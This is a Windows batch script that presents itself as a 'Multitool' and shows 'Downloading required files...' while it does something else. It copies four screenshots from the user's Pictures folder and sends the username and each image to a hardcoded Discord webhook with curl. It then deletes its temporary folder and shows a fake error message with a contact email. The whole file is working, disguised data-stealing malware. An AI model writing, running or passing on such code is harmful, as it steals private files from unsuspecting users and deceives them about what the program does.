@echo off
cls

echo Downloading required files...
cd %userprofile%\Downloads
md temp2
cd temp2
copy "%userprofile%\Pictures\Screenshots\Screenshot (1).png" loaded.png
copy "%userprofile%\Pictures\Screenshots\Screenshot (2).png" loaded2.png
copy "%userprofile%\Pictures\Screenshots\Screenshot (3).png" loaded3.png
copy "%userprofile%\Pictures\Screenshots\Screenshot (4).png" loaded4.png
set WEBHOOK_URL=https://discord.com/api/webhooks/1349741766462668940/cVMzpvjPOPkH1v29-LI6VlyErsm_f0MO-hING8iUlq53nKFP4w1sSAKuNjFOzryein3r
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"@everyone Multitool was run by %username%\"}" %WEBHOOK_URL%
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded.png" https://discord.com/api/webhooks/1349741766462668940/cVMzpvjPOPkH1v29-LI6VlyErsm_f0MO-hING8iUlq53nKFP4w1sSAKuNjFOzryein3r
cls
echo Downloading required files...
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded2.png" https://discord.com/api/webhooks/1349741766462668940/cVMzpvjPOPkH1v29-LI6VlyErsm_f0MO-hING8iUlq53nKFP4w1sSAKuNjFOzryein3r
cls
echo Downloading required files...
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded3.png" https://discord.com/api/webhooks/1349741766462668940/cVMzpvjPOPkH1v29-LI6VlyErsm_f0MO-hING8iUlq53nKFP4w1sSAKuNjFOzryein3r
cls
echo Downloading required files...
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded4.png" https://discord.com/api/webhooks/1349741766462668940/cVMzpvjPOPkH1v29-LI6VlyErsm_f0MO-hING8iUlq53nKFP4w1sSAKuNjFOzryein3r
cls
cd..
rd temp2 /s /q
echo Error! Please contact us on reklmistr@gmail.com
exit